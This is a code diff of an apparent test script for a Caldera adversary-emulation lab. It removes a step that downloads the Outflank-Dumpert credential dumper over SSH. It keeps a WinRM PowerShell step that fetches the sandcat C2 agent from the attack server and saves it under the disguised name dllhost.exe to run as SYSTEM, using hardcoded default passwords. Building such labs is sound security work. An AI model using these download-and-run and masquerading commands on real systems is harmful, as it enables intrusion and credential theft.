@@ -226,13 +226,11 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-    const kaliPrereq = `if [ -f "$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe" ]; then echo "ALREADY_PRESENT: $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe"; else mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && wget "https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" -O $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe && sudo systemctl restart caldera; fi`
-
-  let agentPaw = null
+    let agentPaw = null
 
   try {
     // ── Step 1: Clean slate ──
-    console.log("\n  [1/7] Cleaning previous agents, processes, and tasks...")
+    console.log("\n  [1/6] Cleaning previous agents, processes, and tasks...")
     try {
       const agents = await calderaRest("POST", { index: "agents" })
       for (const a of agents) {
@@ -254,24 +252,7 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Install prereqs on Kali ──
-    console.log("\n  [2/7] Running kali prereq (Outflank-Dumpert download + Caldera restart)...")
-    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
-    console.log(`    => ${prereqResult.slice(0, 200)}`)
-    if (!prereqResult.includes("ALREADY_PRESENT")) {
-      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
-      const start = Date.now()
-      while (Date.now() - start < 120000) {
-        try {
-          await calderaRest("POST", { index: "agents" })
-          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
-          break
-        } catch {}
-        await new Promise(r => setTimeout(r, 1000))
-      }
-    }
-
-    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
+    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
     console.log(`\n  [3/7] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
